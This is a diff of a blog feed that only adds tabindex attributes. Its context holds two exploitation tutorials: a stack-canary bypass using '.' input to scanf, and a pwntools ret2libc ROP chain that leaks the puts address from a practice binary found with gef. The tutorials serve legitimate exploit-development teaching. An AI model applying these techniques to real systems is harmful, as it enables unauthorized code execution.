@@ -68,7 +68,7 @@
       <content>&lt;p&gt;How to bypass the stack canary with &lt;code&gt;.&lt;/code&gt; (dot) and &lt;code&gt;scanf&lt;/code&gt;.&lt;/p&gt;
 &lt;h2 id=&#34;scenario&#34;&gt;Scenario&lt;/h2&gt;
 &lt;p&gt;Imagine that you have given binary implemented by following code (compiled with default settings):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
 &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;() {
     &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;];
@@ -95,7 +95,7 @@
 &lt;li&gt;overwriting stack canary will cause exception&lt;/li&gt;
 &lt;li&gt;we can&amp;rsquo;t brute-force the stack cookie (program is not giving us such possibility)&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
 {
   &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-C0h] BYREF
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+14h] [rbp-BCh]
@@ -119,7 +119,7 @@
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;game-over-not-exactly-&#34;&gt;Game Over? Not exactly ;)&lt;/h2&gt;
 &lt;p&gt;Notice that user input is collected with &lt;code&gt;scanf(&amp;quot;%lf&amp;quot;, &amp;amp;buffer[i])&lt;/code&gt; and here is the trick: you can pass &lt;code&gt;.&lt;/code&gt; (dot) as input, which will &lt;em&gt;skip&lt;/em&gt; overwriting the data in referenced variable:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Number[20]: .
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Number[20]: .
 Number[21]: .
 Your sum: -92773155265697924505313227519998636757689855298695787655081074157174089977436344947792687303154543628009248831613884078618796617025716224.000000
 [Inferior 1 (process 29710) exited normally]
@@ -127,7 +127,7 @@ Your sum: -927731552656979245053132275199986367576898552986957876550810741571740
 &lt;h3 id=&#34;what&#34;&gt;What&lt;/h3&gt;
 &lt;p&gt;First question which comes to mind after seeing this trick is &lt;em&gt;Why it happens&lt;/em&gt; - I will try to answer to this question in the next section - and &lt;em&gt;Is it working only for doubles?&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;I created a very simple test program which will help us understand the scope of this trick without reading the source:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
         &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; foo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3.7&lt;/span&gt;;
         scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lf&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;foo);
@@ -199,7 +199,7 @@ Your sum: -927731552656979245053132275199986367576898552986957876550810741571740
 &lt;li&gt;python3 + pwntools (I&amp;rsquo;m using it in virtualenv)&lt;/li&gt;
 &lt;li&gt;GDB + gef&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# quick install&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# quick install&lt;/span&gt;
 sudo apt install gdb python3 python3-pip
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# install gef (https://github.com/hugsy/gef)&lt;/span&gt;
@@ -212,7 +212,7 @@ virtualenv -p python3 venv
 . ./venv/bin/activte
 pip install pwntools
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;My exploitable binary have following properties:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  checksec
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  checksec
 [+] checksec for &#39;binary&#39;
 Canary                        : ✘
 NX                            : ✓
@@ -225,7 +225,7 @@ RelRO                         : Full
 &lt;/blockquote&gt;
 &lt;p&gt;The easiest way to find the exploitable code is actually to play with the binary, learn about it&amp;rsquo;s background. It is worth noticing that exploitable functionality will be triggered from somewhere where binary interacts with the user (receive &amp;amp; parse packets, user input, configs)&lt;/p&gt;
 &lt;p&gt;In my case the binary have only 4 &amp;ldquo;input fields&amp;rdquo; and only one of them allows to overwrite the allocated buffer:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ida pseudo-code:
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ida pseudo-code:
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fill&lt;/span&gt;()
 {
   &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp-20h] BYREF
@@ -236,7 +236,7 @@ RelRO                         : Full
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Enjoy your %s&amp;#34;&lt;/span&gt;, buf);
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;buf&lt;/code&gt; can handle only 32 bytes, but &lt;code&gt;read&lt;/code&gt; can read 400, so we should be to fully fill the buffer and overwrite the return address. Stack looks like that:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;+----------------+
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+----------------+
 |  return addr   |   &amp;lt;- saved address of return when call fill was exeuted
 +----------------+
 |   stored_rbp   |   &amp;lt;- saved RBP
@@ -252,7 +252,7 @@ RelRO                         : Full
 &lt;/blockquote&gt;
 &lt;h2 id=&#34;prove-that-you-are-in-control&#34;&gt;Prove that you are in control&lt;/h2&gt;
 &lt;p&gt;Next natural step is to verify that we actually can control the &lt;code&gt;rip&lt;/code&gt; registry, the easiest way to achieve that is to run it in gdb with gef installed and generate the pattern:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern create 60
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern create 60
 [+] Generating a pattern of 60 bytes
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
 [+] Saved as &#39;$_gef0&#39;
@@ -261,7 +261,7 @@ aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
 &lt;p&gt;Generated pattern is using readable characters which are containing unique set of characters which can be easily located in the string for identifying the offset of specified substring.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Then just use generated payload as input data in potentially vulnerable functionality. In my case I had to navigate to the proper menu and paste the payload as choice option. As result the program crashed and gdb handled the exception:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;&amp;gt; aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;&amp;gt; aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
 
 Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
 
@@ -309,7 +309,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 0x0000000000400eec in fill ()
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bingo! Program crashed because it tried to jump &amp;amp; execute instructions under the invalid address. Now you can find the address which overwritten return pointer:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern offset $rsp
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern offset $rsp
 [+] Searching &#39;$rsp&#39;
 [+] Found at offset 40 (little-endian search) likely
 [+] Found at offset 33 (big-endian search)
@@ -320,7 +320,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 &lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;As argument for &lt;em&gt;pattern offset&lt;/em&gt; you can also provide the string or hex number:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern offset faaaaaaagaaaaaaahaa
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern offset faaaaaaagaaaaaaahaa
 [+] Searching &#39;faaaaaaagaaaaaaahaa&#39;
 [+] Found at offset 40 (big-endian search)
 
@@ -343,7 +343,7 @@ gef➤  pattern offset 0x6161616161616166
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;pwntools-quick-start&#34;&gt;PWNtools: quick start&lt;/h3&gt;
 &lt;p&gt;We are going to start from loading binaries (binary and libc) into the pwntools:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn
 
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./binary&amp;#39;&lt;/span&gt;)
 &lt;span style=&#34;color:#75715e&#34;&gt;#p = pwn.remote(&amp;#34;138.68.182.108&amp;#34;, 30784)&lt;/span&gt;
@@ -359,7 +359,7 @@ libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=
 &lt;/blockquote&gt;
 &lt;p&gt;Now we can pretty easily use the binaries meta information such us stored symbols, etc.&lt;/p&gt;
 &lt;p&gt;It might happen that vulnerable code is stored behind some menus, for navigation through program you can use several functions:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# receive stdout until this substring&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# receive stdout until this substring&lt;/span&gt;
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;)       &lt;span style=&#34;color:#75715e&#34;&gt;# receive n number of bytes&lt;/span&gt;
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()       &lt;span style=&#34;color:#75715e&#34;&gt;# receive stdout until new line&lt;/span&gt;
 
@@ -380,7 +380,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#3
 &lt;li&gt;Joins the fill bytes with ROP chain&lt;/li&gt;
 &lt;li&gt;Sends the payload&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fill &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fill &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
 rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(elf)
 rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;], [elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;puts&amp;#34;&lt;/span&gt;]])
 rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call(elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fill&amp;#34;&lt;/span&gt;])
@@ -403,7 +403,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
 &lt;li&gt;GOT - tables of the target addresses (resolved runtime)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;You can find these values by yourself:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ objdump -D ./binary| grep puts
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ objdump -D ./binary| grep puts
 &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000400650&lt;/span&gt; &amp;lt;puts@plt&amp;gt;:
   400650:       ff &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;       jmpq   *0x201952&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%rip&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 601fa8 &amp;lt;puts@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
 ...
@@ -414,7 +414,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
 &lt;/ul&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;After sending such prepared payload to the program the stack should look like that:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;+----------------+
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+----------------+
 |  ptr_plt_puts  |   &amp;lt;- pointer to puts function which will be executed
 +----------------+
 |  ptr_got_puts  |   &amp;lt;- address to entry of puts in GOT, value will be printed by puts above
@@ -429,9 +429,9 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now we need to parse the output, this part is individual for each program. I really recommend enabling debugging output which will show transfered data.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;Protip - Enable Debug Mode&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# parse leaked address&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# parse leaked address&lt;/span&gt;
 raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
 raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()  &lt;span style=&#34;color:#75715e&#34;&gt;# \&lt;/span&gt;
 raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:]     &lt;span style=&#34;color:#75715e&#34;&gt;# - skip unnecesary data&lt;/span&gt;
@@ -441,7 +441,7 @@ leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;Packing and Unpacking the bytes&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;pwntools contains built-in functions for &lt;strong&gt;p&lt;/strong&gt;acking and &lt;strong&gt;u&lt;/strong&gt;npacking bytes - conversion of bytes between the strings and ints according to set environment with &lt;code&gt;context&lt;/code&gt; function (endianness is set automatically).&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4142424245464748&lt;/span&gt;)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4142424245464748&lt;/span&gt;)
 &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HGFEBBBA&amp;#39;&lt;/span&gt;
 
 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HEXIFYIT&amp;#39;&lt;/span&gt;)
@@ -459,11 +459,11 @@ leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span
 &lt;p&gt;&lt;strong&gt;Ok, but why?&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;You might  wondering here why not just call the &lt;code&gt;system()&lt;/code&gt; directly in the previous step. It seems to be might simpler, than whole play with calling the same function once again.&lt;/p&gt;
 &lt;p&gt;The reason is simple: there is no &lt;code&gt;system&lt;/code&gt; plt entry in our binary, so we can&amp;rsquo;t call it:&lt;/p&gt;
